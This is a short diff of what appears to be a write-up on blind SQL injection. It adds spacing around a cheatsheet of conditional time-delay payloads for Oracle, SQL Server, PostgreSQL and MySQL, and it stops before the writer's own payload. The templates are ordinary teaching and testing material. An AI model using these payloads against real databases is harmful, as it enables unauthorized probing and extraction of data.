@@ -20,9 +20,13 @@ I followed this cheatsheet and tried them one by one, shaping them to fit my pay
 Conditional time delays
 
 You can test a single boolean condition and trigger a time delay if the condition is true.
+
 Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+
 Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+
 PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+
 MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
 
 I ended up with this:
